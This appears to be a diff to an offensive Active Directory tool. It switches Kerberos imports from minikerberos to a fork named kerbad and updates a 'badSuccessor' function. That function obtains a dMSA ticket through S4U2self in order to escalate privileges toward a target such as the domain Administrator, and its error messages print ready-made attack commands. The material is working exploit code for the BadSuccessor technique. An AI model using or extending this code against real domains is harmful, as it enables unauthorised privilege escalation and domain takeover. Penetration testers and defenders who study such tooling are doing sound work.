@@ -12,12 +12,12 @@ import msldap
 from cryptography import x509
 from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.asymmetric import rsa
-from minikerberos.common import factory
-from minikerberos.common.spn import KerberosSPN
-from minikerberos.common.kirbi import Kirbi
-from minikerberos.common.ccache import CCACHE
-from minikerberos.protocol.external import ticketutil
-from minikerberos.protocol.encryption import Enctype
+from kerbad.common import factory
+from kerbad.common.spn import KerberosSPN
+from kerbad.common.kirbi import Kirbi
+from kerbad.common.ccache import CCACHE
+from kerbad.protocol.external import ticketutil
+from kerbad.protocol.encryption import Enctype
 from winacl.dtyp.security_descriptor import SECURITY_DESCRIPTOR
 
 
@@ -118,21 +118,21 @@ def badSuccessor(conn, dmsa: str, t: list = ["CN=Administrator,CN=Users,DC=Curre
         )
     splitted_url = conn.ldap.co_url.split("-",1)
     if "sspi" in splitted_url[0]:
-        LOG.error("[-] SSPI is not supported yet to retrieve dMSA TGT, use Rubeus or minikerberos certstore, e.g.:")
-        LOG.error(f"python minikerberos-bAD/examples/getS4U2self.py 'kerberos+certstore://{conn.conf.domain}\\{conn.conf.username}@192.168.100.5' 'krbtgt/{conn.ldap.dc_domain}@{conn.ldap.dc_domain}' '{dmsa_sama}@{conn.ldap.dc_domain}' --dmsa")
+        LOG.error("[-] SSPI is not supported yet to retrieve dMSA TGT, use Rubeus or kerbad certstore, e.g.:")
+        LOG.error(f"badS4U2self 'kerberos+certstore://{conn.conf.domain}\\{conn.conf.username}@192.168.100.5' 'krbtgt/{conn.ldap.dc_domain}@{conn.ldap.dc_domain}' '{dmsa_sama}@{conn.ldap.dc_domain}' --dmsa")
         return
     url = "kerberos+" + splitted_url[1]
-    LOG.debug(f"[*] Using minikerberos url: {url}")
+    LOG.debug(f"[*] Using kerbad url: {url}")
     try:
         cu = factory.KerberosClientFactory.from_url(url)
         client = cu.get_client_blocking()
         service_spn = KerberosSPN.from_spn(f"krbtgt/{conn.ldap.dc_domain}@{conn.ldap.dc_domain}")
         target_user = KerberosSPN.from_upn(f"{dmsa_sama}@{conn.ldap.dc_domain}")
-        tgs, encTGSRepPart, key = client.S4U2self(target_user, service_spn, is_dmsa=True)
+        tgs, encTGSRepPart, key = client.with_clock_skew(client.S4U2self, target_user, service_spn, is_dmsa=True)
     except Exception as e:
         LOG.error(f"[-] Failed to retrieve dMSA TGT")
         LOG.error("[-] Try using Rubeus, or something like:")
-        LOG.error(f"python minikerberos-bAD/examples/getS4U2self.py '{url}' 'krbtgt/{conn.ldap.dc_domain}@{conn.ldap.dc_domain}' '{dmsa_sama}@{conn.ldap.dc_domain}' --dmsa")
+        LOG.error(f"badS4U2self '{url}' 'krbtgt/{conn.ldap.dc_domain}@{conn.ldap.dc_domain}' '{dmsa_sama}@{conn.ldap.dc_domain}' --dmsa")
         raise e
 
     kirbi = Kirbi.from_ticketdata(tgs, encTGSRepPart)
